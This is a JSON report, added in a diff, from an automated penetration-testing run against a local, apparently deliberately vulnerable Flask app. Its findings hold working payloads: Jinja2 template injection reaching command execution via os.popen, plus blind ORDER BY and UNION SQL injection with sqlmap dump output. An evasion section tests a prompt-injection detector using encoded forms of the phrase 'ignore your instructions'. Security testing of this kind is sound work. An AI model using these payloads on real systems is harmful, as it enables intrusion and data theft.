@@ -1,0 +1,782 @@
+{
+  "repo": "e2e-strixpaid-final",
+  "repo_url": "/tmp/test-vuln-hard",
+  "target_url": "http://127.0.0.1:8098",
+  "target_class": "local",
+  "stealth": "direct \u2014 no Tor for local targets (Arti has no loopback route)",
+  "started": "2026-11-09T20:04:26Z",
+  "duration_s": 854,
+  "strix_run_dir": "/opt/ares/strix/strix_runs/test-vuln-hard_7c9b",
+  "strix_model": "strix-paid",
+  "strix_seconds": 468,
+  "betterleaks": {
+    "hits": 50,
+    "rc": 1,
+    "leaks": [
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 4866,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 4866,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-api-key",
+        "file": "/repo/app.log",
+        "line": 5559,
+        "match_prefix": "api\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8536,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8537,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8538,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8539,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8540,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8541,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8542,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8543,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8544,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8545,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8546,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8547,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8548,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8549,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8550,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8551,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8552,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8553,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8554,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8555,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8556,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8557,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8558,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8561,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8562,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8564,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8567,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8574,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8575,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8576,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8580,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8581,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8583,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8584,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8586,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8587,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "jwt",
+        "file": "/repo/app.log",
+        "line": 10637,
+        "match_prefix": "eyJ\u2026"
+      },
+      {
+        "rule": "jwt",
+        "file": "/repo/app.log",
+        "line": 10747,
+        "match_prefix": "eyJ\u2026"
+      },
+      {
+        "rule": "jwt",
+        "file": "/repo/app.log",
+        "line": 10854,
+        "match_prefix": "eyJ\u2026"
+      },
+      {
+        "rule": "generic-api-key",
+        "file": "/repo/app.log",
+        "line": 11287,
+        "match_prefix": "tok\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 11453,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-api-key",
+        "file": "/repo/app.log",
+        "line": 11875,
+        "match_prefix": "tok\u2026"
+      },
+      {
+        "rule": "jwt",
+        "file": "/repo/app.log",
+        "line": 13507,
+        "match_prefix": "eyJ\u2026"
+      },
+      {
+        "rule": "jwt",
+        "file": "/repo/app.log",
+        "line": 13522,
+        "match_prefix": "eyJ\u2026"
+      },
+      {
+        "rule": "generic-api-key",
+        "file": "/repo/app.log",
+        "line": 15576,
+        "match_prefix": "tok\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 121432,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 121432,
+        "match_prefix": "htt\u2026"
+      }
+    ]
+  },
+  "strix_findings": [
+    {
+      "title": "Server-Side Template Injection (Jinja2) to Remote Code Execution in POST /render `tpl` form field",
+      "severity": "critical",
+      "description": "The `POST /render` endpoint passes the user-supplied form field `tpl` directly to `flask.render_template_string()`, which compiles and evaluates it with the default, unsandboxed Jinja2 environment. Any unauthenticated client that can send a form-encoded POST can therefore evaluate arbitrary template expressions, walk Python object internals, and execute operating-system commands as the account running the application.",
+      "poc": "1. Identify the transport: the endpoint accepts only POST with an `application/x-www-form-urlencoded` body; GET and PUT return 405.\n2. Send a benign form field `tpl=hello` and confirm it is echoed back as `hello`, establishing baseline behavior.\n3. Send `tpl={{7*7}}` and observe the response body `49`, then `tpl={{7*8}}` and observe `56`. This proves the input is evaluated as server-side template syntax rather than merely reflected.\n4. Fingerprint the engine by sending `${7*7}`, `<%= 7*7 %>` and `#{7*7}` (all returned verbatim) and `{{7*\"7\"}}` (returns `7777777`), confirming the engine is Jinja2, not Mako or Twig/EJS.\n5. Confirm internal object access with `tpl={{config}}` and `tpl={{lipsum.__globals__}}`, which return the Flask configuration and the `jinja2.utils` module globals.\n6. Achieve command execution with `tpl={{cycler.__init__.__globals__.os.popen('id').read()}}`; the response body is the real output of `id`.\n7. Repeat with `uname -a`, `cat /etc/hostname` and `env` through the same `.os.popen(...).read()` primitive to demonstrate arbitrary command execution and data exfiltration.\n8. Replay the request against the patched application (rendering a static template with the value passed as a context variable) and confirm the payloads are returned as literal text and no command runs.",
+      "target": "/workspace/test-vuln-hard (Flask application, app.py)",
+      "endpoint": "/render",
+      "method": "POST",
+      "cvss": 9.8,
+      "finding_class": "dynamic",
+      "source": "vulnerabilities.json"
+    },
+    {
+      "title": "SQL Injection via ORDER BY clause in GET /orders sort parameter",
+      "severity": "high",
+      "description": "The `sort` query parameter of `GET /orders` is interpolated directly into the `ORDER BY` clause of a SQLite statement, allowing arbitrary SQL expressions to be injected. Because a sort expression produces no visible output, the flaw yields a fully deterministic **blind boolean oracle**: an attacker defines a predicate over any table and reads its truth value from the ordering of the returned rows. Using that oracle, the `note` column (which the query never selects) was extracted character by character, and the database version and schema were enumerated.",
+      "poc": "1. Confirm the parameter changes row ordering legitimately: request `/orders?sort=id` (rows ordered 1,2,3) and `/orders?sort=qty` (rows ordered 3,1,2). Record both as the two reference orderings.\n2. Confirm the value is parsed as SQL syntax rather than a literal: request `/orders?sort=nosuchcol` and observe the HTTP 500 with `no such column: nosuchcol`.\n3. Send the blind predicate `/orders?sort=(CASE WHEN (SELECT substr(note,1,5) FROM orders WHERE id=1)='flag{' THEN id ELSE qty END)` and observe the response ordered 1,2,3 (predicate true).\n4. Send the same request with a deliberately false predicate (`='zzzz{'`) and observe the response ordered 3,1,2 (predicate false). The response body is byte-identical in length, so only ordering distinguishes the cases.\n5. Automate steps 3\u20134 over an alphabet and character positions to recover the full `note` value of the first row, then over `sqlite_master` to recover the schema and `sqlite_version()`.",
+      "target": "Flask orders application (app.py)",
+      "endpoint": "/orders?sort=",
+      "method": "GET",
+      "cvss": 7.5,
+      "finding_class": "dynamic",
+      "source": "vulnerabilities.json"
+    },
+    {
+      "title": "SQL Injection in POST /orders/by-sku JSON sku field (UNION-based data and schema disclosure)",
+      "severity": "high",
+      "description": "The `sku` field of the JSON body posted to `POST /orders/by-sku` is interpolated into a quoted string literal in a SQLite `WHERE` clause. A single-quote character breaks out of the literal, allowing boolean conditions and `UNION SELECT` statements to be appended. The confirmation retrieved every row of the `orders` table \u2014 including the `note` column the endpoint exposes for only one row \u2014 and dumped the table schema and engine version.",
+      "poc": "1. Establish the baseline: POST `{\"sku\":\"alpha\"}` to `/orders/by-sku` and note the single returned row `[[1,\"alpha\",\"flag{orderby_ok}\"]]`.\n2. Prove the value is parsed as SQL by injecting a boolean: POST `{\"sku\":\"alpha' AND '1'='1\"}` (returns the baseline row) and then `{\"sku\":\"alpha' AND '1'='2\"}` (returns `[]`). The identical response length with a different result confirms the condition is evaluated by the database.\n3. Prove arbitrary row access: POST `{\"sku\":\"x' UNION SELECT id, sku, note FROM orders WHERE '1'='1\"}` and observe all three rows returned, including `note` values the endpoint would never return for a single-SKU lookup.\n4. Prove schema access: POST `{\"sku\":\"x' UNION SELECT 1,name,sql FROM sqlite_master WHERE '1'='1\"}` and observe the `CREATE TABLE` statement for `orders`.\n5. Optionally repeat with `{\"sku\":\"x' UNION SELECT 1, sqlite_version(), (SELECT group_concat(name) FROM sqlite_master) WHERE '1'='1\"}` for version and object enumeration.",
+      "target": "Flask orders application (app.py)",
+      "endpoint": "/orders/by-sku",
+      "method": "POST",
+      "cvss": 7.5,
+      "finding_class": "dynamic",
+      "source": "vulnerabilities.json"
+    },
+    {
+      "title": "Server-Side Template Injection (Jinja2) to Remote Code Execution in POST /render `tpl` form field\n\nThe `POST /render` endpoint passes the user-supplied form fie",
+      "severity": "error",
+      "description": "Server-Side Template Injection (Jinja2) to Remote Code Execution in POST /render `tpl` form field\n\nThe `POST /render` endpoint passes the user-supplied form field `tpl` directly to `flask.render_template_string()`, which compiles and evaluates it with the default, unsandboxed Jinja2 environment. Any unauthenticated client that can send a form-encoded POST can therefore evaluate arbitrary template expressions, walk Python object internals, and execute operating-system commands as the account running the application.",
+      "poc": "",
+      "target": "",
+      "source": "findings.sarif"
+    },
+    {
+      "title": "SQL Injection via ORDER BY clause in GET /orders sort parameter\n\nThe `sort` query parameter of `GET /orders` is interpolated directly into the `ORDER BY` clause",
+      "severity": "error",
+      "description": "SQL Injection via ORDER BY clause in GET /orders sort parameter\n\nThe `sort` query parameter of `GET /orders` is interpolated directly into the `ORDER BY` clause of a SQLite statement, allowing arbitrary SQL expressions to be injected. Because a sort expression produces no visible output, the flaw yields a fully deterministic **blind boolean oracle**: an attacker defines a predicate over any table and reads its truth value from the ordering of the returned rows. Using that oracle, the `note` column (which the query never selects) was extracted character by character, and the database version and schema were enumerated.",
+      "poc": "",
+      "target": "",
+      "source": "findings.sarif"
+    },
+    {
+      "title": "SQL Injection in POST /orders/by-sku JSON sku field (UNION-based data and schema disclosure)\n\nThe `sku` field of the JSON body posted to `POST /orders/by-sku` i",
+      "severity": "error",
+      "description": "SQL Injection in POST /orders/by-sku JSON sku field (UNION-based data and schema disclosure)\n\nThe `sku` field of the JSON body posted to `POST /orders/by-sku` is interpolated into a quoted string literal in a SQLite `WHERE` clause. A single-quote character breaks out of the literal, allowing boolean conditions and `UNION SELECT` statements to be appended. The confirmation retrieved every row of the `orders` table \u2014 including the `note` column the endpoint exposes for only one row \u2014 and dumped the table schema and engine version.",
+      "poc": "",
+      "target": "",
+      "source": "findings.sarif"
+    }
+  ],
+  "endpoints": [
+    "http://127.0.0.1:8098/render",
+    "http://127.0.0.1:8098/orders?sort=?sort=1",
+    "http://127.0.0.1:8098/orders?sort=1",
+    "http://127.0.0.1:8098/orders/by-sku"
+  ],
+  "sqlmap": {
+    "url": "http://127.0.0.1:8098/orders?sort=1",
+    "injectable": true,
+    "rc": 0,
+    "dbms": "SQLite",
+    "techniques": [
+      "boolean-based blind"
+    ],
+    "tables": [
+      "orders"
+    ],
+    "dump_rc": 0,
+    "dump_rows": 3,
+    "dumped_table": "orders",
+    "sensitive_exposed": true,
+    "sample": [
+      "| 1  | 3   | alpha | flag{orderby_ok} |",
+      "| 2  | 7   | beta  | nothing          |",
+      "| 3  | 1   | gamma | x                |"
+    ],
+    "columns": "| id | qty | sku   | note             |"
+  },
+  "sqlmap_post": {
+    "injectable": false,
+    "method": "POST",
+    "skipped": "no POST body injection reproduced"
+  },
+  "sstimap": {
+    "url": "http://127.0.0.1:8098/render",
+    "vulnerable": true,
+    "confidence": "high",
+    "engine": "Jinja2",
+    "rce": true,
+    "rc": 0,
+    "post_param": "tpl",
+    "post_data_type": "form",
+    "via": "POST body"
+  },
+  "xsstrike": {
+    "vectors": 0
+  },
+  "nmap": {
+    "host": "127.0.0.1",
+    "port": 8098,
+    "services": [
+      [
+        "unknown",
+        "1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :"
+      ]
+    ],
+    "rc": 0
+  },
+  "ffuf": {
+    "paths": 1,
+    "found": [
+      "http://127.0.0.1:8098/orders"
+    ]
+  },
+  "nuclei": {
+    "hits": 0,
+    "findings": [],
+    "rc": 0
+  },
+  "metasploit": {
+    "server": "Werkzeug/3.0.1 Python/3.12.3",
+    "module": null,
+    "rc": 0,
+    "candidates": [
+      "exploit/multi/http/werkzeug_debug_rce",
+      "exploit/multi/http/werkzeug_debug_rce"
+    ]
+  },
+  "sweep": {
+    "candidates": 14,
+    "sstimap_hits": [],
+    "sstimap_low": [],
+    "xsstrike_hits": []
+  },
+  "clock": {
+    "clock": {
+      "ok": true,
+      "height": 975212,
+      "tip_time": 1794254484,
+      "mediantime": 1794249932,
+      "now_est": 1794254668,
+      "interval": [
+        1794254484,
+        1794254669
+      ],
+      "uncertainty_s": 92,
+      "elapsed_since_tip_s": 1,
+      "next_block_eta_s": 416,
+      "skew_s": 1,
+      "wall_skew_s": 1,
+      "ref_time": 1794254667.1150017,
+      "ref_spread_s": 2,
+      "chain_lag_s": 185,
+      "source": "mempool.space",
+      "height_spread": 0,
+      "verified": true,
+      "chain": {
+        "ok": true,
+        "height": 975212,
+        "tip_hash": "000000000000000000013919c63197af6079db7cdce98e9c70f33310a6ecd858",
+        "headers_checked": 12,
+        "link_ok": true,
+        "pow_ok": true,
+        "bits_ok": true,
+        "mtp11": 1794248298,
+        "mtp_rule_ok": true,
+        "time_bounds_ok": true,
+        "difficulty": 148364561003867.4,
+        "continuity": {
+          "anchor_height": 975206,
+          "anchor_hash": "00000000000000000000463276b0cd855387eef67a21edf6ac44c82838a3c540",
+          "bootstrapped": false,
+          "walked": 0,
+          "reorg_depth": null,
+          "rooted": true,
+          "pin": {
+            "height": 974990,
+            "hash": "00000000000000000000060a86c8d28dce411044214051e27c27947ed3ea26c5",
+            "status": "matched",
+            "source": "self-recorded lockdown 2026-11-07",
+            "class": "self_recorded",
+            "rooted_by": {
+              "height": 974985,
+              "class": "buried_multi_source",
+              "source": "3/3 sources agree, buried 6, PoW+linkage verified locally"
+            }
+          },
+          "roots": [
+            {
+              "height": 974990,
+              "class": "self_recorded",
+              "source": "self-recorded lockdown 2026-11-07"
+            },
+            {
+              "height": 974985,
+              "class": "buried_multi_source",
+              "source": "3/3 sources agree, buried 6, PoW+linkage verified locally"
+            }
+          ],
+          "advanced_from": 975206,
+          "verified_against": "00000000000000000000463276b0cd855387eef67a21edf6ac44c82838a3c540",
+          "seeded": {
+            "at": 1794081193,
+            "sources": [
+              "mempool.space",
+              "blockstream.info",
+              "blockchain.info"
+            ],
+            "agreeing": 3,
+            "tip_height": 974977,
+            "tip_hash": "000000000000000000003f035792bcf369cd50a07e4bd82e95fca75e88aeded5",
+            "votes": 1,
+            "wallet_depth": 6
+          },
+          "ok": true,
+          "verified_depth": {
+            "count": 10102,
+            "lowest": 965111,
+            "highest": 975212,
+            "span": 10102
+          }
+        },
+        "source": "mempool.space",
+        "errors": [],
+        "rooted": true
+      },
+      "height_mismatch": null,
+      "degraded": false,
+      "freshness_s": 0,
+      "wall_now": 1794254669
+    },
+    "calendar": {
+      "block_height": 975212,
+      "btc_day": 6772,
+      "btc_week": 967,
+      "btc_weekday": 3,
+      "btc_domain": "Query",
+      "is_sabbath": false,
+      "halving_era": 4,
+      "blocks_until_halving": 74788,
+      "block_reward": 3.125,
+      "epoch": {
+        "era": 4,
+        "name": "Fourth Reduction",
+        "reward": 3.125,
+        "alchemy": "Fermentation",
+        "element": "Ether"
+      },
+      "minute_slot": 332,
+      "supply_mined": 95.7621,
+      "timestamp": "2026-11-09T20:04:29.180Z"
+    },
+    "sabbath": false,
+    "domain": "Query",
+    "btc_day": 6772,
+    "halving_era": 4
+  },
+  "injection": {
+    "cmdi": [],
+    "traversal": [],
+    "default_exec": [],
+    "requests": 42
+  },
+  "sabbath_gate": {
+    "enabled": false,
+    "blocked": false
+  },
+  "evidence_dir": "/opt/ares/security_reports/e2e-strixpaid-final_20261109T200426Z",
+  "evidence_files": [
+    "raw/betterleaks.log",
+    "raw/ffuf.log",
+    "raw/metasploit.log",
+    "raw/nmap.log",
+    "raw/nuclei.log",
+    "raw/sqlmap.log",
+    "raw/sqlmap_post.log",
+    "raw/sstimap.log",
+    "raw/sstimap_post.log",
+    "raw/strix.log",
+    "report.json",
+    "report.md",
+    "sqlmap/127.0.0.1/dump/SQLite_masterdb/orders.csv",
+    "sqlmap/127.0.0.1/log",
+    "sqlmap/127.0.0.1/session.sqlite",
+    "sqlmap/127.0.0.1/target.txt",
+    "sqlmap/results-11092026_0915pm.csv",
+    "sqlmap/results-11092026_0916pm.csv",
+    "sqlmap_post/127.0.0.1/log",
+    "sqlmap_post/127.0.0.1/session.sqlite",
+    "sqlmap_post/127.0.0.1/target.txt",
+    "sqlmap_post/results-11092026_0916pm.csv"
+  ],
+  "evasion": {
+    "thresholds": {
+      "flag": 0.6,
+      "block": 0.9
+    },
+    "weakest_first": [
+      {
+        "transform": "identity",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "base64",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "base64x2",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "rot13",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "hex_escape",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "unicode_escape",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "zero_width",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "spaced",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "fullwidth",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "leet",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "reversed",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "mixed",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      }
+    ],
+    "control": {
+      "payload": "ignore your instructions",
+      "composite": 1.0,
+      "flagged": true,
+      "ok": true
+    },
+    "overall_flag_rate": 1.0
+  },
+  "memory": {
+    "new": [
+      {
+        "fp": "1aca562bde3af4ca",
+        "title": "Server-Side Template Injection (Jinja2) to Remote Code Execution in POST /render `tpl` form field"
+      },
+      {
+        "fp": "91099c53f2c1a125",
+        "title": "SQL Injection via ORDER BY clause in GET /orders sort parameter"
+      },
+      {
+        "fp": "04ecb6dd9b3eee01",
+        "title": "SQL Injection in POST /orders/by-sku JSON sku field (UNION-based data and schema disclosure)"
+      },
+      {
+        "fp": "f3575643910a3d0b",
+        "title": "Server-Side Template Injection (Jinja2) to Remote Code Execution in POST /render `tpl` form field\n\nThe `POST /render` endpoint passes the user-supplied form fie"
+      },
+      {
+        "fp": "3de400af8797a175",
+        "title": "SQL Injection via ORDER BY clause in GET /orders sort parameter\n\nThe `sort` query parameter of `GET /orders` is interpolated directly into the `ORDER BY` clause"
+      },
+      {
+        "fp": "3a90b9ea0a674898",
+        "title": "SQL Injection in POST /orders/by-sku JSON sku field (UNION-based data and schema disclosure)\n\nThe `sku` field of the JSON body posted to `POST /orders/by-sku` i"
+      }
+    ],
+    "persisting": [],
+    "resolved": [],
+    "counts": {
+      "new": 6,
+      "persisting": 0,
+      "resolved": 0,
+      "active": 6,
+      "age_of_oldest_active": null
+    },
+    "run": "2026-11-09T20:04:26Z"
+  },
+  "receipt": {
+    "receipt_id": "495a937b77c261432c0db1fc8aa00ce49c7ee218371b8771c0e20de0430053c7",
+    "path": "/opt/ares/security_receipts/e2e-strixpaid-final/495a937b77c26143.json",
+    "merkle_root": "b0acd9c2fa1c846678138238874570d28ba1315a83530455f1e632470975400d",
+    "chain_index": 0,
+    "prev_receipt": null,
+    "artifacts": 20,
+    "diagnostics": 6
+  },
+  "ots": {
+    "skipped": true
+  },
+  "time": {
+    "skipped": true
+  },
+  "anchor": {
+    "skipped": true
+  },
+  "vantage_broadcast_id": 76637,
+  "vantage_response": {
+    "broadcast_id": 76637,
+    "status": "ready"
+  }
+}
